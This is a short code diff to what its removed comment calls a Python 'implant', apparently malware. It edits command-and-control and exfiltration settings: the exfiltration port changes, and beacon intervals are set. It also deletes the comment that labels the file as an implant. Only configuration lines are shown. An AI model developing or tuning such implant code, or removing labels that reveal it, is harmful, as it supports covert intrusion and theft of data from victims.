@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Python 3.5-compatible implant. Compiled to a stripped ELF via PyInstaller.
+
 import json
 import os
 import random
@@ -28,7 +28,7 @@ from helper import (
 C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
 C2_PORT = int(os.environ.get("C2_PORT", "443"))
 EXFIL_HOST = os.environ.get("EXFIL_HOST", C2_HOST)
-EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "8443"))
+EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "9443"))
 BEACON_MIN = float(os.environ.get("BEACON_MIN", "4"))
 BEACON_MAX = float(os.environ.get("BEACON_MAX", "12"))
 
